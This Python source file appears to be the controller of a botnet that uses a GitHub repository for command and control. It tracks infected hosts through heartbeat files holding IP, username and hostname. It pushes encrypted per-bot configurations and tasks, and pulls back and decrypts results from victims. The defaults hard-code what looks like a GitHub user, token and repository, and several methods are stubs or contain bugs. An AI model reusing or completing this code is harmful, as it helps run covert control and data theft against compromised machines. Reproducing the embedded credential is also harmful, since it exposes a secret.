import json
import os
import random
import string
import time
import sys

try:
    import Crypto
except ImportError:
    if sys.platform == 'win32':
        from commander.thirdparty.win.Crypto import Random
        from commander.thirdparty.win.Crypto.PublicKey import RSA
        from commander.thirdparty.win.Crypto.Cipher import AES, PKCS1_OAEP
    else:
        from commander.thirdparty.unx.Crypto import Random
        from commander.thirdparty.unx.Crypto.PublicKey import RSA
        from commander.thirdparty.unx.Crypto.Cipher import AES, PKCS1_OAEP

from commander.lib.githubapi import GitHubAPI
from commander.lib.database import init_db
from commander.lib.datatype import AttribDict


class DBManager(object):
    def __init__(self, dbf='../data.db'):
        self.db = init_db(dbf)

    def get_bot_conf(self, botid=None):
        ret = None
        default = self.db.getone('BotSettings', condition=dict(ID=0))
        if botid:
            ret = self.db.getone('BotSettings', condition=dict(BotID=botid))
        return ret or default

    def save_bot_conf(self, botid, settings):
        bc = self.db.getone('BotSettings', condition=dict(BotID=botid))
        if bc:
            self.db.update('BotSettings', settings,
                           condition=dict(BotID=botid))
        else:
            settings['BotID'] = botid
            self.db.insert('BotSettings', settings)

    def save_bot_key(self, botid, key, _type='rsa'):
        pass

    def get_bots(self):
        return self.db.getlist('Botlist')

    def get_bot(self, botid):
        return self.db.getone('Botlist', condition=dict(BotID=botid))

    def get_task_result(self, tid, bid):
        return self.db.getone('Taskresult',
                              condition=dict(TaskID=tid, BotID=bid))

    def save_task_result(self, tid, bid, result):
        # tr = self.get_task_result(tid, bid)
        # if tr:
        #     tr['Result'] = result
        #     self.db.update('Taskresult', tr,
        #                    condition=dict(TaskID=tid, BotID=bid))
        # else:
        #     self.db.insert('Taskresult', dict(Result=result),
        #                    condition=dict(TaskID=tid, BotID=bid))
        self.db.insert('Taskresult', dict(Result=result),
                       condition=dict(TaskID=tid, BotID=bid))

    def bot_add(self):
        pass

    def bot_update(self):
        pass

    def bot_delete(self):
        pass

    def bot_select(self):
        pass


class CommandBase(GitHubAPI, DBManager):

    def __init__(self, dbf='../data.db', gtoken=None, guser=None, gpwd=None,
                 grepo=None, gbranch='master'):
        super(CommandBase, self).__init__(dbf=dbf, gtoken=gtoken, guser=guser, gpwd=gpwd, grepo=grepo, gbranch=gbranch)
        self.root = os.path.join(os.path.dirname(__file__), "..")
        self.data_path = os.path.join(self.root, 'data')
        self.conf_path = os.path.join(self.root, 'config')
        self.default_setting = None
        self.default_group = '5f03d33d43e04f8f'
        self.init_command()

        self.conf_path = self.default_setting.get('ConfPath')
        self.knock_path = self.default_setting.get('KnockPath') or 'data/hbt/'
        self.result_path = self.default_setting.get('RetPath') or 'data/res/'
        self.sys_private_key = RSA.importKey(
            self.default_setting.get('ComPrivateKey'))
        self.sys_public_key = self.sys_private_key.publickey()
        self.bot_expire_time = 360
        # self.bot_conf = self.load_bot_config_file()

    def init_command(self):
        self.default_setting = self.get_bot_conf()
        if not self.default_setting:
            self.default_setting = AttribDict()
            self.default_setting.BaseGH = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
            self.default_setting.ConfPath = 'config'
            self.default_setting.ModulesPath = 'module'
            self.default_setting.RetGH = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
            self.default_setting.RetPath = 'data'
            self.default_setting.KnockPath = 'data'
            self.default_setting.ComPrivateKey = self.generate_rsa_key().exportKey('der')
            self.default_setting.BotPrivateKey = self.generate_rsa_key().exportKey('der')
            self.default_setting.AESKey = self.random_key()
            self.default_setting.HBTime = 60
            self.db.insert('BotSettings', self.default_setting)

    def new_bot(self, botid=None, gid=None, remote=True, raw=False, new_key=True):
        botid = botid or os.urandom(8).encode('hex')
        gid = gid or self.default_group
        # conf = self.set_bot_config(botid, **dict())
        conf = self.default_setting     # self.get_bot_conf(botid)
        if new_key:
            conf['AESKey'] = self.random_key()
            conf['BotPrivateKey'] = self.generate_rsa_key()
            self.save_bot_conf(botid, conf)

        # TODO:
        #     Generate bot.py
        # self.generate_bot(botid, conf, remote, raw)

        # self.save_GH_bot_config(botid, conf)
        self.put_GH_bot_config(botid, conf)

    def check_bots(self):
        bots = self.get_GH_bots_meta()
        for bot in bots:
            bid = bot['bid']
            bot_in_db = self.get_bot(bid)
            if not bot_in_db:
                # bt = self.get_GH_bot_with_id(bid, gid)
                # bot_path = b.pop('path')
                bt = self.get_data_with_path(bot['path'])
                # bot = dict(BotID=bid, IP=tmp['ip'], Platform=tmp['platform'],
                #           Username=tmp['username'], Hostname=tmp['hostname'],
                #            Status='UP', LastValidTime=tmp['timestamp'])
                bt['BotID'] = bid
                bt['GroupID'] = bot['gid']
                bt['SHA'] = bot['sha']
                bt['CheckTime'] = time.time()
                bt['Status'] = 'ONLINE'
                self.db.insert('Botlist', bt)
            elif bot_in_db and bot_in_db['sha'] != bot['sha']:
                # bt = self.get_GH_bot_with_id(bid, gid)
                bt = self.get_data_with_path(bot['path'])
                bt['BotID'] = bid
                bt['GroupID'] = bot['gid']
                bt['SHA'] = bot['sha']
                bt['CheckTime'] = time.time()
                # bot['LastValidTime'] = tmp['timestamp']
                self.db.update('Botlist', bt, dict(BotID=bid))

            if not self.is_bot_alive(bot, self.bot_expire_time):
                bot['Status'] = 'DOWN'
                self.db.update('Botlist', bot, dict(BotID=bid))

    def check_bots_alive(self):
        # self.check_bots()
        # bots = self.db.getlist('Botlist')
        bots = self.get_bots()
        for bot in bots:
            if not self.is_bot_alive(bot, self.bot_expire_time):
                bot['Status'] = 'DOWN'
                self.db.update('Botlist', bot, dict(BotID=bot['BotID']))

    def is_bot_alive(self, bot, expire=300):
        # bot = self.db.getone('Botlist', condition=dict(BotID=botid))
        expire_time = bot['CheckTime'] + expire
        if bot and time.time() < expire_time:
            return True
        else:
            return False

    def get_GH_bots_meta(self):
        ret = []
        bots = self.GHget(self.knock_path)
        for b in bots:
            gid, bid = b['name'].split('.')[0].split('-')
            tmp = dict(bid=bid, gid=gid, path=b['path'], sha=b['sha'])
            ret.append(tmp.copy())
        return ret

    def get_GH_bot_with_id(self, botid, groupid):
        name = '-'.join((groupid, botid)) + '.data'
        info = self.GHget(self.knock_path + name)
        if info:
            info = json.loads(self.decrypt(info['content'].decode('base64')), self.sys_private_key)
            return info
        return {}

    # def bot_conf_path(self, bid, gid=None):
    #     gid = gid or self.default_group
    #     return os.path.join(self.conf_path, gid, bid + '.conf')
    #
    # def bot_result_path(self, bid, gid=None):
    #     gid = gid or self.default_group
    #     return os.path.join(self.data_path, gid, bid, '')
    #
    # def load_bot_config_file(self, botid, gid=None):
    #     path = self.bot_conf_path(botid, gid)
    #     if not os.path.exists(path):
    #         path = os.path.join(self.conf_path, 'bot.conf')
    #
    #     with open(path, 'rb') as f:
    #         return json.loads(f.read())
    #
    # def save_bot_config_file(self, conf, botid, gid=None):
    #     path = self.bot_conf_path(botid, gid)
    #     with open(path, 'rb') as f:
    #         f.write(json.dumps(conf))

    def save_GH_bot_config(self, groupid, botid, config):
        conf = self.get_bot_conf(botid)
        conf.update(config)
        print('[*] Save local bot config...')
        self.save_bot_conf(botid, conf)
        print('[+] Save ok')
        print('[*] Put/Update remote bot config...')
        self.put_GH_bot_config(groupid, botid, conf)
        print('[+] Put config on to Github ok')
        return conf

    def put_GH_bot_config(self, groupid, botid, config, plain=False):
        name = '-'.join((groupid, botid)) + '.conf'
        conf_path = '/'.join((self.conf_path, name))
        # key = self.get_bot_key_RSA(botid).publickey()

        if not plain:
            key = self.get_bot_key_RSA(botid)
            config = self.encrypt(config, key)

        # encrypt config with bot public if plain is False
        # config = config if plain else self.encrypt(config, key)

        conf = self.GHget(conf_path)
        if not conf:
            self.GHput(conf_path, config)
        else:
            self.GHupdate(conf_path, config, conf['sha'])

    def generate_rsa_key(self, num=2048):
        key = RSA.generate(num)
        return key

    def random_key(self, num=16):
        return ''.join(random.sample(string.printable, num))

    @staticmethod
    def _toRSAKey(key_bin):
        try:
            return RSA.importKey(key_bin)
        except Exception as e:
            print(e)
            return None

    def get_bot_key_RSA(self, botid):
        # k = self.db.getone('Botlist', condition=dict(BotID=botid))
        # bot_private_key = RSA.importKey(k['PrivateKey'])
        # return bot_private_key
        k = self.get_bot_conf(botid)
        return self._toRSAKey(k['BotPrivateKey'])

    def check_results(self):
        rts = self.get_result_meta()
        for rt in rts:
            dbrt = self.get_task_result(rt['taskid'], rt['botid'])
            if not dbrt:
                result = self.get_data_with_path(rt['path'])
                result['TaskID'] = rt['taskid']
                result['BotID'] = rt['botid']
                result['SHA'] = rt['sha']
                self.db.insert('Taskresult', result)
            elif dbrt['SHA'] == rt['sha']:
                continue
            else:
                result = self.get_data_with_path(rt['path'])
                result['TaskID'] = rt['taskid']
                result['BotID'] = rt['botid']
                result['SHA'] = rt['sha']
                self.db.update(
                    'Taskresult', result,
                    dict(TaskID=rt['taskid'], BotID=rt['botid']))

    def get_data_with_path(self, path):
        result = self.GHget(path)
        if result:
            content = json.loads(self.decrypt(
                result['content'].decode('base64'), self.sys_private_key))
            return result

        return {}

    def get_result_with_taskid(self, taskid):
        results = self.get_result_meta()
        return [r for r in results if r['taskid'] == taskid]

    def get_result_with_botid(self, botid):
        results = self.get_result_meta()
        return [r for r in results if r['botid'] == botid]

    def get_result_meta(self):
        ret = []
        results = self.GHget(self.result_path)
        for r in results:
            bid, tid = r['name'].split('.')[:2]
            tmp = dict(botid=bid, taskid=tid, path=r['path'], sha=r['sha'])
            ret.append(tmp.copy())

        return ret

    def clean_result(self):
        rts = self.GHget(self.result_path)
        for rt in rts:
            self.GHdelete(rt['path'], rt['sha'], 'clean')

    def create_task(self, botid, name, module, Type, **settings):
        taskid = os.urandom(8).encode('hex')
        task = dict(TaskID=taskid, BotID=botid, Name=name,
                    Module=module, params=settings['params'])

    def put_task_config(self, config, taskid, plain=False):
        content = config if plain else self.encrypt(config, self.sys_private_key)
        path = self.conf_path + 'task/' + taskid + '.tsk'

    def encrypt(self, content, rsa_key_obj=None, aes_key=None):
        if not rsa_key_obj and not aes_key:
            # no rsa and no aes encrypt
            return (content + ';;[]').encode('base64')
        elif not rsa_key_obj:
            # aes encrypt
            return (self.aes_encrypt(content, aes_key) + ';;').encode('base64')
        elif not aes_key:
            # rsa encrypt
            return self.rsa_encrypt(content, rsa_key_obj).encode('base64')
        else:
            # aes encrypt with rsa encrypted key
            enkey = self.rsa_encrypt(aes_key, rsa_key_obj)
            enc = self.aes_encrypt(content, aes_key)
            return ';;'.join((enc, enkey)).encode('base64')

    def decrypt(self, content, rsa_key_obj=None, aes_key=None):
        if not rsa_key_obj and not aes_key:
            return content.decode('base64')

        content = content.decode('base64')
        if ';;' in content:
            # parse encrypt content and encrypt key
            c, e = content.split(';;')
            if not e:
                # no encrypt key
                return self.aes_decrypt(c, aes_key)
            else:
                # have encrypt key, decrypt the key
                k = self.rsa_decrypt(e, rsa_key_obj)
                # decrypt the content
                return self.aes_decrypt(c, k)
        else:
            # no aes encrypt
            return self.rsa_decrypt(content, rsa_key_obj)

    def rsa_encrypt(self, content, key=None):
        if not key:
            return content
        cipher = PKCS1_OAEP.new(key)
        return cipher.encrypt(content)

    def rsa_decrypt(self, content, key=None):
        if not key:
            return content
        if not key.has_private():
            print('[!] Not a valid PrivateKey!')
            return None
        cipher = PKCS1_OAEP.new(key)
        return cipher.decrypt(content)

    def aes_encrypt(self, content, key):
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CFB, iv)
        msg = iv + cipher.encrypt(content.decode('utf-8'))
        return msg

    def aes_decrypt(self, content, key):
        iv = content[:AES.block_size]
        msg = content[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CFB, iv)
        msg = cipher.decrypt(msg)
        return msg.encode('utf-8')

    def sign(self, content, cert):
        pass


# class Object(object):
#
#     def __init__(self, **kw):
#         pass
#
#     def todict(self):
#         return self.__dict__
#
#     def __getattr__(self, k):
#         v = self.__dict__.get(k, None)
#         return v
#
#     def __setattr__(self, k, v):
#         self.__dict__['k'] = v
#
#
# class Bot(Object):
#
#     def __init__(self, **kw):
#         self.BotID = kw.get('bot_id')
#         self.GroupID = kw.get('group_id')
#         self.IP = kw.get('ip')
#         self.Platform = kw.get('platform')
#         self.Username = kw.get('username')
#         self.Hostname = kw.get('hostname')
#         # self.
#         self.Status = 'UP'
#         self.LastValidTime = kw.get('timestamp')
#
#
# class Result(Object):
#
#     def __init__(self, **kw):
#         self.TaskID = kw.get('taskid')
#         self.BotID = kw.get('botid')
#         self.Result = kw.get('result')
#         self.StartTime = kw.get('start')
#         self.ReportTime = kw.get('timestamp')
#
#
# class Task(Object):
#
#     def __init__(self, **kw):
#         pass


if __name__ == '__main__':
    cb = CommandBase()
